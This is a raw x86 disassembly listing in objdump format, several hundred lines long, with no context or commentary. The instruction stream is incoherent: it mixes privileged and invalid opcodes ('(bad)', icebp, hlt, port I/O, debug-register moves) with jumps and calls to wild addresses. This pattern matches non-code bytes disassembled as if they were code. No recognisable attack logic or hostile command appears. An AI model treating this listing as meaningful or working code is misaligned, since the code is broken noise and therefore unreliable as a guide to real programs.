  41dd6e:	mov    ds:0x9d1bc978,eax
  41dd73:	popf   
  41dd74:	fs pop esi
  41dd76:	push   eax
  41dd77:	dec    ecx
  41dd78:	sar    eax,0xa0
  41dd7b:	imul   ebp,DWORD PTR [edi+ebp*4+0xe307bfa],0xba6b75ca
  41dd86:	stos   BYTE PTR es:[edi],al
  41dd87:	lea    esi,[esp+eiz*8]
  41dd8a:	fcom   QWORD PTR [ebx-0xdf59c8e]
  41dd90:	test   eax,0x76db19cd
  41dd95:	adc    eax,0x3f90c61c
  41dd9a:	mov    dh,0xb9
  41dd9c:	mov    bh,0xc
  41dd9e:	std    
  41dd9f:	test   al,0x32
  41dda1:	mov    ecx,0x8309cc3a
  41dda6:	ret    
  41dda7:	icebp  
  41dda8:	cmp    DWORD PTR [ecx-0x54],0xc1b7e9cf
  41ddaf:	icebp  
  41ddb0:	test   al,0xb4
  41ddb2:	test   BYTE PTR [edi+0x66890120],al
  41ddb8:	fld    TBYTE PTR [ebx]
  41ddba:	hlt    
  41ddbb:	ror    BYTE PTR [edx],0x9d
  41ddbe:	mov    ecx,0x3e6ff9aa
  41ddc3:	es pop es
  41ddc5:	inc    ebx
  41ddc6:	call   0xebd8f34e
  41ddcb:	sub    al,0x57
  41ddcd:	sahf   
  41ddce:	and    bh,BYTE PTR [esi+0x55]
  41ddd1:	push   edi
  41ddd2:	xlat   BYTE PTR ds:[ebx]
  41ddd3:	lods   al,BYTE PTR ds:[esi]
  41ddd4:	jmp    0x41dde1
  41ddd6:	or     ch,BYTE PTR [esi-0x5d]
  41ddd9:	sbb    edx,DWORD PTR [eax+0x1c5ead2c]
  41dddf:	add    BYTE PTR [esi],ch
  41dde1:	adc    DWORD PTR [esi+0x248ae5b],esi
  41dde7:	mov    edi,0x238ef4eb
  41ddec:	xor    al,0x9c
  41ddee:	dec    edx
  41ddef:	std    
  41ddf0:	fwait
  41ddf1:	lea    ecx,[eax]
  41ddf3:	adc    edi,DWORD PTR [esi-0x25]
  41ddf6:	ror    BYTE PTR [esi],0x91
  41ddf9:	je     0x41ddeb
  41ddfb:	inc    ebp
  41ddfc:	cmp    BYTE PTR ds:0x4cbdd7c6,bh
  41de02:	push   esi
  41de03:	add    DWORD PTR [edi-0xf881a6e],esp
  41de09:	sub    al,0x8f
  41de0b:	push   esp
  41de0c:	fsubr  st(1),st
  41de0e:	dec    ebx
  41de0f:	in     eax,0x3f
  41de11:	sbb    dl,dh
  41de13:	xchg   ebx,eax
  41de14:	cli    
  41de15:	daa    
  41de16:	dec    ebx
  41de17:	jmp    0x41dd99
  41de19:	jl     0x41ddad
  41de1b:	imul   edx
  41de1d:	pop    ss
  41de1e:	fs out dx,eax
  41de20:	hlt    
  41de21:	sbb    esi,ebx
  41de23:	adc    bh,dh
  41de25:	cmp    dl,BYTE PTR [ebp-0x680e661a]
  41de2b:	js     0x41dea2
  41de2d:	push   es
  41de2e:	mov    DWORD PTR [edx-0x6687f27f],edi
  41de34:	and    ch,bh
  41de36:	ret    0xa2fd
  41de39:	push   eax
  41de3a:	out    0x53,eax
  41de3c:	adc    al,0xe2
  41de3e:	(bad)
  41de41:	faddp  st(4),st
  41de43:	pop    eax
  41de44:	add    ebp,ebx
  41de46:	mov    ebx,0x4d192a68
  41de4b:	mov    al,0x76
  41de4d:	cmp    eax,ecx
  41de4f:	inc    eax
  41de50:	cmp    DWORD PTR [eax-0x6fa5acf1],ebp
  41de56:	push   esi
  41de57:	mov    eax,ds:0x672b167c
  41de5c:	imul   eax,DWORD PTR [ecx-0x5a],0xd636d464
  41de63:	ds xchg edx,eax
  41de65:	inc    edx
  41de66:	int    0x61
  41de68:	repz add ah,BYTE PTR [edx]
  41de6b:	mov    ah,0x2e
  41de6d:	xchg   edi,eax
  41de6e:	(bad)  
  41de6f:	retf   0x22fd
  41de72:	stos   DWORD PTR es:[edi],eax
  41de73:	and    edi,ebx
  41de75:	inc    ebx
  41de76:	inc    ebp
  41de77:	jmp    0x6086c44c
  41de7c:	add    eax,0xe872e7ae
  41de81:	scas   al,BYTE PTR es:[edi]
  41de82:	inc    ebp
  41de83:	jo     0x41de18
  41de85:	dec    ebp
  41de86:	adc    BYTE PTR ds:0x68d4a8df,0x85
  41de8d:	call   0xe600bfd8
  41de92:	jg     0x41de38
  41de94:	into   
  41de95:	test   DWORD PTR [ebx],ebp
  41de97:	leave  
  41de98:	adc    al,0x64
  41de9a:	and    cl,BYTE PTR [ebp-0x6e]
  41de9d:	jp     0x41deb8
  41de9f:	lods   al,BYTE PTR ds:[esi]
  41dea0:	es mov ah,0x58
  41dea4:	sbb    ebp,DWORD PTR [eax-0x5c5a305]
  41deaa:	loop   0x41df20
  41deac:	ds push 0x7adb43e
  41deb2:	push   ebp
  41deb3:	mov    es,WORD PTR [ebx*8-0x49c1b0da]
  41deba:	sbb    DWORD PTR [ecx-0x4be7a7a3],esp
  41dec0:	mov    cl,0x59
  41dec2:	xadd   BYTE PTR [ebp+eiz*4-0x72ebb32d],dh
  41deca:	mov    bh,0xd5
  41decc:	dec    edi
  41decd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dece:	test   eax,esp
  41ded0:	ins    BYTE PTR es:[edi],dx
  41ded1:	je     0x41dec6
  41ded3:	push   ss
  41ded4:	and    BYTE PTR [edi-0x764aff3c],al
  41deda:	xor    eax,0xed8ee273
  41dedf:	mov    ch,0xa7
  41dee1:	ret    0x1c36
  41dee4:	sbb    DWORD PTR [eax+0x35fa2a6e],0x1ab0203a
  41deee:	mov    DWORD PTR [eax+0x29],ecx
  41def1:	and    al,0xe5
  41def3:	add    eax,0xc97d9192
  41def8:	mov    al,ds:0x508bad09
  41defd:	mov    BYTE PTR [esi-0x5951302e],dl
  41df03:	mov    eax,0x59a28273
  41df08:	in     al,0x23
  41df0a:	test   BYTE PTR [edx-0x41b290d3],ah
  41df10:	stc    
  41df11:	shl    BYTE PTR [edi],0xfd
  41df14:	xor    BYTE PTR [edx+0x75],al
  41df17:	push   es
  41df18:	lods   eax,DWORD PTR ds:[esi]
  41df19:	aaa    
  41df1a:	stos   BYTE PTR es:[edi],al
  41df1b:	icebp  
  41df1c:	and    ah,bh
  41df1e:	shr    DWORD PTR ds:0x5c6a72f8,0xdf
  41df25:	jecxz  0x41df66
  41df27:	imul   BYTE PTR [edi]
  41df29:	mov    eax,ds:0x8476406c
  41df2e:	addr16 popa 
  41df30:	or     esi,DWORD PTR [esi]
  41df32:	loope  0x41df28
  41df34:	sub    DWORD PTR [esi-0x60fa71e6],ecx
  41df3a:	std    
  41df3b:	mov    ds:0x2004b31e,eax
  41df40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df41:	xor    eax,0x3848eacb
  41df46:	inc    eax
  41df47:	cmp    eax,0xdc4a3a2e
  41df4c:	cli    
  41df4d:	xor    eax,0x34721500
  41df52:	stc    
  41df53:	(bad)
  41df56:	ins    BYTE PTR es:[edi],dx
  41df57:	push   cs
  41df58:	es xor eax,0x30eb3ded
  41df5e:	pop    esi
  41df5f:	jnp    0x41df8d
  41df61:	inc    DWORD PTR [eax+0x22]
  41df64:	stos   DWORD PTR es:[edi],eax
  41df65:	mov    bh,0xc3
  41df67:	inc    ecx
  41df68:	dec    ebp
  41df69:	sbb    DWORD PTR [ebp-0x43],edx
  41df6c:	jb     0x41df13
  41df6e:	sbb    BYTE PTR [edi+0x30],dh
  41df71:	stos   DWORD PTR es:[edi],eax
  41df72:	jp     0x41dfc2
  41df74:	mov    cl,0x25
  41df76:	mov    DWORD PTR [edi],esi
  41df78:	add    ecx,DWORD PTR [eax+0x39]
  41df7b:	adc    esi,eax
  41df7d:	in     eax,dx
  41df7e:	sahf   
  41df7f:	and    DWORD PTR [esi+0x15],ebx
  41df82:	out    0xcf,eax
  41df84:	ins    BYTE PTR es:[edi],dx
  41df85:	imul   ebx,DWORD PTR [edi],0xe79fb759
  41df8b:	xchg   eax,eax
  41df8d:	mov    ch,0x6f
  41df8f:	push   ebp
  41df90:	cmp    eax,0xd31b14d7
  41df95:	lock xor eax,0x11846c00
  41df9b:	pop    ebp
  41df9c:	xchg   ebx,eax
  41df9d:	push   edx
  41df9e:	test   BYTE PTR [edx],0x2
  41dfa1:	scas   al,BYTE PTR es:[edi]
  41dfa2:	je     0x41dfe0
  41dfa4:	or     edi,DWORD PTR [edi]
  41dfa6:	aaa    
  41dfa7:	call   0xe7d32353
  41dfac:	shl    DWORD PTR [ebx+0x575a6d42],0x9d
  41dfb3:	xchg   edi,eax
  41dfb4:	fild   QWORD PTR [edi]
  41dfb6:	je     0x41df52
  41dfb8:	sbb    al,0xe4
  41dfba:	leave  
  41dfbb:	loop   0x41dffa
  41dfbd:	shl    ebp,1
  41dfbf:	jmp    0x24c28b94
  41dfc4:	retf   
  41dfc5:	pop    ecx
  41dfc6:	sahf   
  41dfc7:	arpl   WORD PTR [edx-0x29faa891],ax
  41dfcd:	icebp  
  41dfce:	sub    al,0x70
  41dfd0:	mov    ebp,0xc32ade7d
  41dfd5:	and    DWORD PTR [eax],edx
  41dfd7:	jge    0x41e005
  41dfd9:	aad    0x19
  41dfdb:	frstor [eax-0x50]
  41dfde:	dec    eax
  41dfdf:	pop    ds
  41dfe0:	add    eax,0x5e2d2a39
  41dfe5:	ins    DWORD PTR es:[edi],dx
  41dfe6:	push   0xae419cef
  41dfeb:	xchg   BYTE PTR [eax],cl
  41dfed:	lock jmp 0x41e021
  41dff0:	icebp  
  41dff1:	sahf   
  41dff2:	cmp    al,0x92
  41dff4:	fmul   st,st(4)
  41dff6:	mov    al,ds:0xc2bea70c
  41dffb:	nop
  41dffc:	sbb    BYTE PTR [ebp+0x18],cl
  41dfff:	aad    0x7
  41e001:	sbb    BYTE PTR [ecx+0x33b2bda1],bh
  41e007:	add    esp,ecx
  41e009:	sub    DWORD PTR [esi-0x65b82a51],edi
  41e00f:	xor    esi,0xb041c5b1
  41e015:	mov    al,0x44
  41e017:	sbb    DWORD PTR [ebx-0x25],ecx
  41e01a:	inc    esp
  41e01b:	fs aad 0x30
  41e01e:	repnz xlat BYTE PTR ds:[ebx]
  41e020:	aad    0x2b
  41e022:	push   edx
  41e023:	mov    al,al
  41e025:	and    DWORD PTR [ecx],0x5c2929c7
  41e02b:	pop    ebx
  41e02c:	cmp    eax,DWORD PTR [eax]
  41e02e:	and    eax,0xad0d3be8
  41e033:	call   0xdbd479df
  41e038:	add    cl,BYTE PTR [esi+0x5d]
  41e03b:	dec    esp
  41e03c:	aaa    
  41e03d:	xchg   al,dh
  41e03f:	mov    eax,ds:0x127016b9
  41e044:	fild   DWORD PTR [ecx]
  41e046:	push   ecx
  41e047:	mov    edx,0x23a79467
  41e04c:	xchg   BYTE PTR [ecx+0x72f86c79],al
  41e052:	adc    DWORD PTR [bx+0x67],ebp
  41e056:	jae    0x41e075
  41e058:	cdq    
  41e059:	in     eax,0x93
  41e05b:	daa    
  41e05c:	aas    
  41e05d:	retf   
  41e05e:	leave  
  41e05f:	sbb    al,0x7
  41e061:	test   al,0x7b
  41e063:	lods   eax,DWORD PTR ds:[esi]
  41e064:	push   ebx
  41e065:	das    
  41e066:	jo     0x41e023
  41e068:	mov    edi,0xd41cf528
  41e06d:	loope  0x41e038
  41e06f:	repz out 0x89,eax
  41e072:	mov    eax,ds:0xf67a2075
  41e077:	outs   dx,BYTE PTR ds:[esi]
  41e078:	ds dec edi
  41e07a:	hlt    
  41e07b:	sahf   
  41e07c:	inc    BYTE PTR [esi+0x61]
  41e07f:	dec    ecx
  41e080:	inc    ecx
  41e081:	pop    ebx
  41e082:	mov    ds:0xdabb8dee,eax
  41e087:	inc    ebx
  41e088:	pushf  
  41e089:	lds    ebx,FWORD PTR [ebx+ecx*8]
  41e08c:	adc    DWORD PTR [ebx],esp
  41e08e:	jae    0x41e082
  41e090:	xchg   ecx,eax
  41e091:	sbb    eax,0x32c8143
  41e096:	and    BYTE PTR [edx-0x2b],cl
  41e099:	push   0x66
  41e09b:	call   0x904cbbe7
  41e0a0:	out    0x74,al
  41e0a2:	pop    ebp
  41e0a3:	pushf  
  41e0a4:	adc    ebx,edx
  41e0a6:	mov    al,ds:0x20a4c034
  41e0ab:	out    dx,al
  41e0ac:	and    al,0xd3
  41e0ae:	sar    BYTE PTR [ebp+0xefc5ac9],cl
  41e0b4:	sbb    BYTE PTR [ebx+esi*1-0x14],dl
  41e0b8:	sub    edi,0xffffffc0
  41e0bb:	jnp    0x41e097
  41e0bd:	inc    esi
  41e0be:	fdivr  QWORD PTR [edx]
  41e0c0:	clc    
  41e0c1:	clc    
  41e0c2:	xchg   ebx,eax
  41e0c3:	das    
  41e0c4:	mov    bl,0x44
  41e0c6:	rol    eax,0x7
  41e0c9:	shl    BYTE PTR [eax],cl
  41e0cb:	cdq    
  41e0cc:	lods   al,BYTE PTR gs:[esi]
  41e0ce:	and    BYTE PTR [ebx],cl
  41e0d0:	lea    ebx,[ebx+0x27]
  41e0d3:	out    0x70,eax
  41e0d5:	shr    DWORD PTR [edi-0x7b],cl
  41e0d8:	repnz xacquire xchg BYTE PTR [eax+0x386d117b],bl
  41e0e0:	in     al,dx
  41e0e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0e2:	retf   0x8b88
  41e0e5:	xchg   ecx,eax
  41e0e6:	push   ss
  41e0e7:	lss    ecx,FWORD PTR [edi+0x678de30]
  41e0ee:	jmp    0x41e125
  41e0f0:	mov    edx,0x586ca1c7
  41e0f5:	ins    BYTE PTR es:[edi],dx
  41e0f6:	xchg   ecx,eax
  41e0f7:	mov    eax,ds:0x476dc43f
  41e0fc:	test   al,0xfb
  41e0fe:	xor    al,BYTE PTR gs:[ebx+0x470fc56e]
  41e105:	(bad)  
  41e107:	outs   dx,BYTE PTR ds:[esi]
  41e108:	dec    ebx
  41e109:	hlt    
  41e10a:	retf   
  41e10b:	xchg   edx,eax
  41e10c:	xchg   esi,eax
  41e10d:	mov    ebp,0xe2221b45
  41e112:	push   ebx
  41e113:	aam    0xab
  41e115:	jne    0x41e13d
  41e117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e118:	adc    eax,0xc114a439
  41e11d:	loope  0x41e14e
  41e11f:	adc    ebp,DWORD PTR [ecx]
  41e121:	pop    es
  41e122:	pop    DWORD PTR [edi+0x12]
  41e125:	sar    BYTE PTR [ebx+edx*1],0xdf
  41e129:	xor    esp,edx
  41e12b:	into   
  41e12c:	or     BYTE PTR [ebp-0x48d27380],al
  41e132:	les    edi,FWORD PTR [ecx+0x75]
  41e135:	and    bh,BYTE PTR [edx-0x35]
  41e138:	cmp    BYTE PTR [ebp-0x60503ce6],dh
  41e13e:	je     0x41e0de
  41e140:	call   0xeadb:0xaa13e1d
  41e147:	jp     0x41e0e0
  41e149:	loopne 0x41e1c7
  41e14b:	shl    DWORD PTR [eax],0xbe
  41e14e:	and    al,0x6a
  41e150:	pop    ebp
  41e151:	xchg   esp,eax
  41e152:	test   al,0xe7
  41e154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e155:	test   eax,0xb811704
  41e15a:	xchg   esi,eax
  41e15b:	retf   
  41e15c:	arpl   WORD PTR [ebx+0x6698a473],bx
  41e162:	mov    eax,ds:0xff3cc279
  41e167:	ret    
  41e168:	mov    bh,0xbe
  41e16a:	ja     0x41e1a3
  41e16c:	sub    BYTE PTR [edx],0x7
  41e16f:	dec    ecx
  41e170:	cs ins DWORD PTR es:[edi],dx
  41e172:	pop    ecx
  41e173:	cwde   
  41e174:	dec    ecx
  41e175:	add    eax,DWORD PTR [di-0x1d]
  41e179:	sub    ah,BYTE PTR [edx+0x2e]
  41e17c:	in     al,dx
  41e17d:	cmp    eax,DWORD PTR [edi-0x29]
  41e180:	scas   al,BYTE PTR es:[edi]
  41e181:	or     BYTE PTR [esi+0x2e3e97b6],dl
  41e187:	sub    al,0x41
  41e189:	test   al,0xcc
  41e18b:	dec    ecx
  41e18c:	jmp    0x7f70e15c
  41e191:	pop    eax
  41e192:	pop    edi
  41e193:	inc    esi
  41e194:	call   DWORD PTR [esi-0xf48c508]
  41e19a:	jmp    0xfe8e2416
  41e19f:	sbb    dl,BYTE PTR [eax-0x1986dcf2]
  41e1a5:	and    cl,cl
  41e1a7:	stos   DWORD PTR es:[edi],eax
  41e1a8:	std    
  41e1a9:	add    eax,0xbbfbc0fb
  41e1ae:	out    0x68,eax
  41e1b0:	xor    eax,DWORD PTR [bx+si+0x3502]
  41e1b5:	pusha  
  41e1b6:	jle    0x41e140
  41e1b8:	in     al,0xbd
  41e1ba:	in     al,dx
  41e1bb:	aas    
  41e1bc:	add    al,0xa9
  41e1be:	cmp    ecx,DWORD PTR [ebx]
  41e1c0:	sbb    al,dl
  41e1c2:	(bad)  [eax+0x4f0dd96]
  41e1c8:	sub    dl,BYTE PTR [ebp+0x40]
  41e1cb:	shl    DWORD PTR [ebx-0x4846bf5],0x77
  41e1d2:	push   ds
  41e1d3:	or     al,0x78
  41e1d5:	test   DWORD PTR [edi],ebp
  41e1d7:	jmp    0x263d79f0
  41e1dc:	pop    ds
  41e1dd:	lock push ss
  41e1df:	inc    ebp
  41e1e0:	inc    edi
  41e1e1:	js     0x41e22f
  41e1e3:	fcom   DWORD PTR [edi+ebp*4]
  41e1e6:	cmp    DWORD PTR [ecx+0x305bb1c2],ebx
  41e1ec:	jne    0x41e25e
  41e1ee:	sbb    al,0xdd
  41e1f0:	jno    0x41e1c2
  41e1f2:	pop    ebp
  41e1f3:	loopne 0x41e1c0
  41e1f5:	or     DWORD PTR [esi-0x3e],esi
  41e1f8:	jnp    0x41e1a7
  41e1fa:	lods   eax,DWORD PTR ds:[esi]
  41e1fb:	pushf  
  41e1fc:	sub    DWORD PTR [ebx],ebp
  41e1fe:	mov    bl,0xa9
  41e200:	pop    esp
  41e201:	sar    edx,0x2b
  41e204:	add    al,0xca
  41e206:	jns    0x41e1c2
  41e208:	repnz repz or DWORD PTR [edx],0x474de26f
  41e210:	pop    edx
  41e211:	nop
  41e212:	push   edx
  41e213:	js     0x41e1a0
  41e215:	inc    ecx
  41e216:	repz loope 0x41e1f9
  41e219:	cmp    al,BYTE PTR [ebx+esi*1-0x803c2ab]
  41e220:	and    bh,bl
  41e222:	xchg   esi,eax
  41e224:	push   edi
  41e225:	mov    edx,ebp
  41e227:	fidiv  WORD PTR [eax+0x495d1ed8]
  41e22d:	nop
  41e22e:	jl     0x41e1ee
  41e230:	pop    DWORD PTR [edx+0x7c]
  41e233:	arpl   WORD PTR [ecx+0x512d87ec],si
  41e239:	fucomi st,st(3)
  41e23b:	mov    dh,0x31
  41e23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e23e:	adc    BYTE PTR [ebp-0x5c],0xc9
  41e242:	cmp    ch,cl
  41e244:	push   0x3c268e89
  41e249:	sub    ebp,DWORD PTR [esi]
  41e24b:	add    DWORD PTR [ebx],0x1c15613c
  41e251:	adc    BYTE PTR [edx+eiz*8-0x5efd4ef5],bl
  41e258:	aam    0x6b
  41e25a:	aas    
  41e25b:	fsub   QWORD PTR [ebx-0x1a6adbf5]
  41e261:	push   ebp
  41e262:	mov    bl,0xdf
  41e264:	pop    DWORD PTR [eax]
  41e266:	scas   al,BYTE PTR es:[edi]
  41e267:	scas   al,BYTE PTR es:[edi]
  41e268:	loope  0x41e25b
  41e26a:	js     0x41e1ee
  41e26c:	cmp    BYTE PTR [ebx+ebp*1-0xd0a71ee],dl
  41e273:	je     0x41e218
  41e275:	das    
  41e276:	lahf   
  41e277:	nop
  41e278:	jp     0x41e1ff
  41e27a:	(bad)  
  41e27b:	mov    BYTE PTR [edx],ch
  41e27d:	adc    bl,ah
  41e27f:	imul   edi,DWORD PTR [ebx+0x656c006f],0x5e5908dd
  41e289:	add    bh,dl
  41e28b:	push   cs
  41e28c:	fcomp  QWORD PTR [ebx]
  41e28e:	xor    bl,BYTE PTR [esi]
  41e290:	xchg   esi,eax
  41e291:	jmp    0x3d079b1d
  41e296:	jb     0x41e312
  41e298:	dec    eax
  41e299:	pop    edx
  41e29a:	inc    edi
  41e29b:	add    al,BYTE PTR [edx+0x454f4753]
  41e2a1:	mov    DWORD PTR [ecx-0x5f],esi
  41e2a4:	sbb    BYTE PTR [eax-0x5],dl
  41e2a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2a8:	mov    bl,0xa5
  41e2aa:	or     cl,ch
  41e2ac:	retf   
  41e2ad:	jne    0x41e24d
  41e2af:	xchg   edx,eax
  41e2b0:	jbe    0x41e282
  41e2b2:	pop    ds
  41e2b3:	mov    ebp,0x2fe6550b
  41e2b8:	stos   BYTE PTR es:[edi],al
  41e2b9:	test   DWORD PTR [edi-0x7ae0ea2e],ebp
  41e2bf:	sub    eax,0x27f304b8
  41e2c4:	xchg   esi,eax
  41e2c5:	or     ecx,DWORD PTR [ebp+ebp*8-0x46af7e92]
  41e2cc:	jecxz  0x41e2c9
  41e2ce:	call   0x35334ff7
  41e2d3:	int    0xf0
  41e2d5:	(bad)
  41e2d9:	dec    ebx
  41e2da:	sub    DWORD PTR [edi],edi
  41e2dc:	arpl   bx,si
  41e2de:	inc    esp
  41e2df:	test   al,0x36
  41e2e1:	imul   ebp,DWORD PTR [ebx],0xfdec1423
  41e2e7:	out    0xb8,al
  41e2e9:	pop    ss
  41e2ea:	fwait
  41e2eb:	arpl   WORD PTR [ebp-0x3c],ax
  41e2ee:	mov    ebx,0xf2e5bd7f
  41e2f3:	lds    ebp,FWORD PTR [ebx]
  41e2f5:	loope  0x41e334
  41e2f7:	mov    ecx,0x7cd362bf
  41e2fc:	test   DWORD PTR [edi],ebx
  41e2fe:	cmp    al,bh
  41e300:	and    ah,ah
  41e302:	add    eax,DWORD PTR [ebx]
  41e304:	and    DWORD PTR gs:[ebx],edi
  41e307:	sbb    al,0xd
  41e309:	call   0xad14:0xff73ff0a
  41e310:	dec    BYTE PTR ss:[ecx]
  41e313:	jle    0x41e32b
  41e315:	push   0xdf69719e
  41e31a:	push   edx
  41e31b:	loope  0x41e36a
  41e31d:	(bad)  
  41e31e:	stos   BYTE PTR es:[edi],al
  41e31f:	push   0xffffffda
  41e321:	sub    DWORD PTR [eax+0x2a],esi
  41e324:	or     ah,BYTE PTR [edx+ebp*1-0x31]
  41e328:	scas   al,BYTE PTR es:[edi]
  41e329:	aad    0xb5
  41e32b:	call   0x9731cae4
  41e330:	adc    ah,BYTE PTR [ebx]
  41e332:	sbb    ecx,DWORD PTR [edx+esi*4+0x76]
  41e336:	hlt    
  41e337:	fadd   DWORD PTR [esp+eiz*2+0xeeb589]
  41e33e:	mov    BYTE PTR [ebx-0x48b5ff60],al
  41e344:	std    
  41e345:	dec    ebx
  41e346:	sub    al,0x77
  41e348:	xor    BYTE PTR [ebx+0x61],cl
  41e34b:	dec    ebp
  41e34c:	fxch   st(2)
  41e34e:	cli    
  41e34f:	push   esi
  41e350:	bnd ja 0x41e38f
  41e353:	or     cl,BYTE PTR [ebx]
  41e355:	push   0xfffffff7
  41e357:	mov    eax,0x5f1144d5
  41e35c:	cwde   
  41e35d:	(bad)  
  41e35e:	xor    eax,0xfee5c594
  41e363:	mov    esp,0x225276e6
  41e368:	jp     0x41e345
  41e36a:	cmp    al,0x62
  41e36c:	xchg   ecx,eax
  41e36d:	pop    ss
  41e36e:	rol    DWORD PTR [esi-0x1fe7d632],1
  41e374:	pop    ss
  41e375:	scas   al,BYTE PTR es:[edi]
  41e376:	dec    ebx
  41e377:	and    esi,DWORD PTR [ecx-0x7e]
  41e37a:	addr16 cwde 
  41e37c:	jbe    0x41e31f
  41e37e:	xchg   ecx,eax
  41e37f:	pop    esi
  41e380:	fcomp  DWORD PTR [edx-0x57774b2a]
  41e386:	cmc    
  41e387:	dec    esp
  41e388:	popa   
  41e389:	cmp    DWORD PTR [edx],esi
  41e38b:	jo     0x41e336
  41e38d:	ja     0x41e37d
  41e38f:	add    ah,dl
  41e391:	in     eax,dx
  41e392:	sbb    eax,0xf94e031e
  41e397:	mov    WORD PTR [ebp-0x2ae6f6dd],?
  41e39d:	idiv   DWORD PTR [eax-0x6f]
  41e3a0:	mov    cl,0x6c
  41e3a2:	sub    al,0x26
  41e3a4:	sub    edi,DWORD PTR [edx+ebx*8-0xde913ce]
  41e3ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3ac:	inc    eax
  41e3ad:	and    esp,DWORD PTR [ecx-0x49]
  41e3b0:	out    0x6e,al
  41e3b2:	inc    eax
  41e3b3:	and    eax,0xaa5be3d6
  41e3b8:	push   esi
  41e3b9:	retf   
  41e3ba:	mov    ds:0x8cce0da9,al
  41e3bf:	mov    bh,0x65
  41e3c1:	sub    eax,DWORD PTR [ecx]
  41e3c3:	push   0xa2f71992
  41e3c8:	cmp    al,0x42
  41e3ca:	aam    0x13
  41e3cc:	mov    ebp,0xf7573a31
  41e3d1:	inc    edi
  41e3d2:	sahf   
  41e3d3:	(bad)  
  41e3d4:	push   0x4b
  41e3d6:	push   ecx
  41e3d7:	inc    edx
  41e3d8:	jb     0x41e39c
  41e3da:	mov    esi,0x38883b67
  41e3df:	push   0xd838704a
  41e3e4:	pop    ds
  41e3e5:	push   ebx
  41e3e6:	push   ss
  41e3e7:	dec    eax
  41e3e8:	jmp    0x2c19:0x7e661ac1
  41e3ef:	mov    ds:0xfcd0bad4,eax
  41e3f4:	lds    eax,FWORD PTR [esi]
  41e3f6:	scas   eax,DWORD PTR es:[edi]
  41e3f7:	(bad)  
  41e3f8:	adc    esp,DWORD PTR [esi+ebx*4]
  41e3fb:	sub    al,0xef
  41e3fd:	inc    edx
  41e3fe:	cwde   
  41e3ff:	fidiv  WORD PTR [ebp+0x4212ea55]
  41e405:	(bad)  
  41e406:	ucomiss xmm7,DWORD PTR [esi-0x281de27d]
  41e40d:	push   edx
  41e40e:	outs   dx,BYTE PTR ds:[esi]
  41e40f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e410:	mov    WORD PTR [ecx-0x3c],?
  41e413:	mov    gs,WORD PTR [edx]
  41e415:	mov    ebp,0x86e56685
  41e41a:	clc    
  41e41b:	dec    esi
  41e41c:	jmp    0x8d94:0xb5a5bdd7
  41e423:	jp     0x41e3dd
  41e425:	xchg   ebx,eax
  41e426:	in     al,dx
  41e427:	loop   0x41e46e
  41e429:	sub    dh,bh
  41e42b:	daa    
  41e42c:	sbb    dl,bh
  41e42e:	cwde   
  41e42f:	add    DWORD PTR [edi-0x5aa8a4d3],ecx
  41e435:	xchg   edi,eax
  41e436:	std    
  41e437:	or     DWORD PTR [esi-0x3c2062cc],eax
  41e43d:	mov    ds:0x6ba3989,eax
  41e442:	push   0x57
  41e444:	leave  
  41e445:	stos   BYTE PTR es:[edi],al
  41e446:	and    ebp,DWORD PTR [esi]
  41e448:	mov    ds:0x3a049ba4,al
  41e44d:	adc    BYTE PTR [ecx+0x3e],dh
  41e450:	fild   WORD PTR [edx-0x1c9048ab]
  41e456:	aad    0xca
  41e458:	ins    BYTE PTR es:[edi],dx
  41e459:	stc    
  41e45a:	xor    ecx,edi
  41e45c:	jle    0x41e42b
  41e45e:	pop    ds
  41e45f:	(bad)  
  41e460:	mov    db2,esp
  41e463:	pushf  
  41e464:	mov    edx,0x98162578
  41e469:	mov    ds:0x19abf256,eax
  41e46e:	cmc    
  41e46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e470:	pop    ecx
  41e471:	ret    0x5089
  41e474:	xlat   BYTE PTR ds:[ebx]
  41e475:	cs inc edx
  41e477:	outs   dx,BYTE PTR ds:[esi]
  41e478:	repnz inc edi
  41e47a:	fstp   DWORD PTR [eax-0x26]
  41e47d:	xor    DWORD PTR [edi-0x5c],ecx
  41e480:	stos   BYTE PTR es:[edi],al
  41e481:	xchg   ebx,eax
  41e482:	arpl   bx,ax
  41e484:	add    dh,BYTE PTR [ecx]
  41e486:	scas   eax,DWORD PTR es:[edi]
  41e487:	(bad)  
  41e488:	mov    bl,0x7e
  41e48a:	pop    ecx
  41e48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e48c:	or     BYTE PTR [ecx+0x6d],dh
  41e48f:	je     0x41e4c1
  41e491:	out    0xe0,al
  41e493:	xchg   ebp,eax
  41e494:	pop    es
  41e495:	jp     0x41e496
  41e497:	adc    BYTE PTR [ebp-0x68c5593e],bl
  41e49d:	and    eax,0x26b2a66
  41e4a2:	xor    ecx,esi
  41e4a4:	outs   dx,BYTE PTR ds:[esi]
  41e4a5:	sub    dh,0xaf
  41e4a8:	xor    cl,BYTE PTR [esi+0x5f]
  41e4ab:	or     al,BYTE PTR [esi-0x4e]
  41e4ae:	jl     0x41e4a0
  41e4b0:	and    BYTE PTR [eax],bh
  41e4b2:	bnd jne 0x41e507
  41e4b5:	and    eax,0x9fd42cb2
  41e4ba:	push   ebp
  41e4bb:	cs or  eax,0xeaa27196
  41e4c1:	(bad)  
  41e4c2:	and    eax,0x6fe573da
  41e4c7:	xchg   ebx,eax
  41e4c8:	fild   WORD PTR [eax-0x736756af]
  41e4ce:	dec    edi
  41e4cf:	adc    al,0x47
  41e4d1:	lods   al,BYTE PTR ds:[esi]
  41e4d2:	jl     0x41e48f
  41e4d4:	ins    BYTE PTR es:[edi],dx
  41e4d5:	leave  
  41e4d6:	test   eax,0xb7b3eee0
  41e4db:	pop    edi
  41e4dc:	icebp  
  41e4dd:	aaa    
  41e4de:	mov    ebx,0x98297158
  41e4e3:	mov    ebp,0xace7b2bf
  41e4e8:	lock cmp dh,cl
  41e4eb:	mov    bl,BYTE PTR [eax+0xc809f9e]
  41e4f1:	js     0x41e54c
  41e4f3:	bnd jo 0x41e4ee
